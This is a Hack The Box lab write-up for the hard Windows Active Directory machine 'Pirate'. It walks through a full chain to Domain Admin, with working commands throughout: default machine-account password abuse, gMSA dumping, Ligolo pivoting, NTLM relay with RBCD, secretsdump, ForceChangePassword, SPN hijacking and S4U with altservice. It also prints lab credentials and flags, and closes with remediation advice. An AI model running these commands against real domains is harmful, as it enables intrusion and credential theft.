# HTB Machine Report — Pirate

**Date:** 2026-05-27
**Author:** Franksimon
**Platform:** Hack The Box
**Difficulty:** HARD
**OS:** Windows (Active Directory)
**IP:** 10.129.244.95
**Status:** Pwned

---

## 1. Executive Summary

Pirate es una máquina Windows Active Directory con múltiples hosts internos accesibles solo mediante pivoting. El acceso inicial se logra abusando del grupo **Pre-Windows 2000 Compatible Access** para autenticar como `MS01$` con contraseña predeterminada, dumpear credenciales gMSA y obtener shell WinRM en el DC. Con Ligolo-ng como pivote hacia la red interna, se combina NTLM relay con RBCD para obtener Admin en WEB01. La escalación a Domain Admin combina ForceChangePassword, SPN hijacking y S4U2Proxy con `-altservice`.

**Cadena de ataque:**
```
Pre-Win2000 (MS01$) → gMSA dump → evil-winrm DC01 → Ligolo pivot
→ NTLM relay + RBCD → Admin WEB01 → secretsdump → a.white creds
→ ForceChangePassword → SPN hijack → S4U + altservice → Domain Admin
```

---

## 2. Enumeration

### 2.1 Port Scan

```bash
sudo nmap -Pn -sC -sV -p- --min-rate 5000 10.129.244.95
```

| Port     | State | Service     |
|----------|-------|-------------|
| 88/tcp   | open  | Kerberos    |
| 389/tcp  | open  | LDAP        |
| 445/tcp  | open  | SMB         |
| 636/tcp  | open  | LDAPS       |
| 3268/tcp | open  | Global Catalog |
| 5985/tcp | open  | WinRM       |

- Dominio: `pirate.htb` / DC: `DC01.pirate.htb`

### 2.2 Pre-Windows 2000 Compatible Access

```bash
# MS01$ con contraseña predeterminada (nombre máquina en minúsculas)
getTGT.py 'pirate.htb/MS01$:ms01' -dc-ip 10.129.244.95
```

### 2.3 gMSA Dump

```bash
KRB5CCNAME=MS01$.ccache python3 gMSADumper.py \
  -u 'MS01$' -k -d pirate.htb -l 10.129.244.95
# → gMSA_ADFS_prod$ NTLM hash
```

### 2.4 Reconocimiento WEB01 (post-pivot)

```bash
nmap -Pn -sC -sV -p 80,443,445,5985 192.168.100.2
```

WEB01 (192.168.100.2): SMB **signing enabled but not required** → vulnerable a relay.

---

## 3. Vulnerability Identification

| # | Vulnerabilidad | CVSS | Ubicación |
|---|---------------|------|-----------|
| 1 | Pre-Win2000 contraseña predeterminada | 7.5 | MS01$ |
| 2 | gMSA password legible por MS01$ | 8.0 | msDS-ManagedPassword |
| 3 | NTLM relay + RBCD (SMB signing not required) | 9.0 | WEB01 SMB |
| 4 | ForceChangePassword ACE | 7.8 | a.white → a.white_adm |
| 5 | WriteSPN en DC01 para grupo IT | 9.1 | AD ACL |
| 6 | Constrained delegation con trustedtoauth | 8.5 | a.white_adm |

---

## 4. Exploitation

### 4.1 evil-winrm como gMSA_ADFS_prod$

```bash
evil-winrm -i 10.129.244.95 -u 'gMSA_ADFS_prod$' -H '<NTLM_HASH>'
```

`gMSA_ADFS_prod$` es miembro de Remote Management Users en DC01.

### 4.2 Ligolo-ng — Pivot 192.168.100.0/24

```bash
# Atacante
./proxy -selfcert -laddr 0.0.0.0:11601

# DC01 (evil-winrm)
upload agent.exe
.\agent.exe -connect 10.10.14.207:11601 -ignore-cert

# Kali — ruta al segmento interno
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
# Ligolo console: session → start
sudo ip route add 192.168.100.0/24 dev ligolo
```

### 4.3 NTLM Relay + RBCD

```bash
# Terminal 1
sudo ntlmrelayx.py -t ldaps://10.129.244.95 \
  --delegate-access --remove-mic -smb2support

# Terminal 2
coercer coerce -l 10.10.14.207 -t 192.168.100.2 \
  -d pirate.htb -u pentest -p 'p3nt3st2025!&' --always-continue
```

Resultado: cuenta `WIHDYOOD$` creada con derechos de delegación sobre WEB01.

### 4.4 S4U2Proxy → Shell en WEB01

```bash
sudo ntpdate -u 10.129.244.95   # sincronizar reloj

getST.py -spn cifs/WEB01.pirate.htb -impersonate Administrator \
  -dc-ip 10.129.244.95 'pirate.htb/WIHDYOOD$:/p/u+d2(o13llbH'

KRB5CCNAME=Administrator@cifs_WEB01.pirate.htb@PIRATE.HTB.ccache \
  wmiexec.py -k -no-pass pirate.htb/Administrator@WEB01.pirate.htb
```

---

## 5. Post-Exploitation

### 5.1 User Flag

```cmd
type C:\Users\a.white\Desktop\user.txt
```

**User flag:** `8780c8e8b4a4f1bb4627760352cc920f`

### 5.2 Credential Dump

```bash
KRB5CCNAME=Administrator@cifs_WEB01.pirate.htb@PIRATE.HTB.ccache \
  secretsdump.py -k -no-pass pirate.htb/Administrator@WEB01.pirate.htb
```

Hallazgo en LSA Secrets:
```
[*] DefaultPassword
PIRATE\a.white:E2nvAOKSz5Xz2MJu
```

---

## 6. Privilege Escalation — Domain Admin

### 6.1 BloodHound

```bash
bloodhound-python -u a.white -p 'E2nvAOKSz5Xz2MJu' \
  -d pirate.htb -ns 10.129.244.95 -c All --zip
```

**ACL chain:**
```
a.white --ForceChangePassword--> a.white_adm
a.white_adm --memberOf--> IT
IT --WriteSPN--> DC01$
```

**a.white_adm:** `trustedtoauth=true`, `AllowedToDelegate=http/WEB01.pirate.htb`

### 6.2 ForceChangePassword

```bash
net rpc password a.white_adm 'Pirate123!' \
  -U 'pirate.htb/a.white%E2nvAOKSz5Xz2MJu' -S 10.129.244.95
```

### 6.3 SPN Hijacking

**Concepto:** Mover `http/WEB01.pirate.htb` de WEB01$ a DC01$. Como `a.white_adm` delega a ese SPN, el S4U2Proxy resultante apunta ahora a DC01.

```bash
# Quitar SPN de WEB01
python3 addspn.py -u 'pirate\a.white_adm' -p 'Pirate123!' \
  -t 'WEB01$' -s 'HTTP/WEB01.pirate.htb' -r 10.129.244.95

# Inyectar SPN en DC01 (IT group tiene WriteSPN)
python3 addspn.py -u 'pirate\a.white_adm' -p 'Pirate123!' \
  -t 'DC01$' -s 'HTTP/WEB01.pirate.htb' 10.129.244.95
```

### 6.4 S4U + altservice → Domain Admin

```bash
getST.py -spn 'http/WEB01.pirate.htb' \
  -altservice 'host/DC01.pirate.htb' \
  -impersonate Administrator \
  -dc-ip 10.129.244.95 \
  'pirate.htb/a.white_adm:Pirate123!'

KRB5CCNAME=Administrator@host_DC01.pirate.htb@PIRATE.HTB.ccache \
  wmiexec.py -k -no-pass pirate.htb/Administrator@DC01.pirate.htb
```

---

## 7. Root Flag

```cmd
type C:\Users\Administrator\Desktop\root.txt
```

**Root flag:** `cb58d84bd134cb4a8496837cedcd152c`

---

## 8. Remediation

| Finding | Recomendación | Prioridad |
|---------|--------------|-----------|
| Pre-Win2000 cuentas activas | Quitar del grupo; rotar contraseñas | Critical |
| gMSA legible por cuentas de máquina | Auditar msDS-GroupMSAMembership | High |
| SMB signing no requerido (WEB01) | Habilitar SMB signing obligatorio via GPO | Critical |
| LDAP signing no requerido (DC01) | Habilitar `Require signing` en DC | Critical |
| ForceChangePassword sobre cuenta admin | Auditar ACLs con BloodHound regularmente | High |
| WriteSPN de grupo no-admin sobre DC01 | Restringir a Domain Admins | High |
| trustedtoauth + constrained delegation | Usar gMSA para servicios en lugar de usuarios | High |

---

## 9. Lessons Learned

- **Pre-Windows 2000 Compatible Access** es el vector inicial más simple posible en AD — siempre enumerar miembros en el reconocimiento.
- **gMSADumper con Kerberos TGT** evita problemas de NTLM bind y funciona incluso con firmas habilitadas.
- **`--remove-mic` en ntlmrelayx** es obligatorio para relay a LDAPS; sin él, la sesión cae.
- **SPN hijacking:** WriteSPN en un objeto permite redirigir hacia qué servidor apunta una configuración de delegación existente, sin necesidad de modificar `msDS-AllowedToDelegateTo` (que requiere DA).
- **`-altservice` en getST.py:** Relabelea el nombre de servicio en el TGS final. Permite adaptar el ticket a la herramienta de acceso (wmiexec usa `host/`, evil-winrm usa `http/`).
- **`/etc/krb5.conf` es obligatorio** para GSSAPI en Linux. Sin él, evil-winrm y otras herramientas fallan con "Matching credential not found" aunque el ccache exista.

> **OSCP checklist — SPN hijacking:**
> ```bash
> # BloodHound: buscar WriteSPN en objetos computadora
> # Verificar AllowedToDelegate de cuentas con trustedtoauth
> # addspn.py -t TARGET$ -s SPN (add) / -r (remove)
> # getST.py -altservice para adaptar SPN al tool de acceso
> ```

---

## 10. References

- [Pre-Windows 2000 Compatible Access](https://www.thehacker.recipes/ad/movement/dacl/pre-windows-2000-computers)
- [gMSADumper](https://github.com/micahvandeusen/gMSADumper)
- [Ligolo-ng](https://github.com/nicocha30/ligolo-ng)
- [NTLM Relay + RBCD](https://www.thehacker.recipes/ad/movement/ntlm/relay)
- [krbrelayx / addspn.py — dirkjanm](https://github.com/dirkjanm/krbrelayx)
- HTB Machine: Pirate
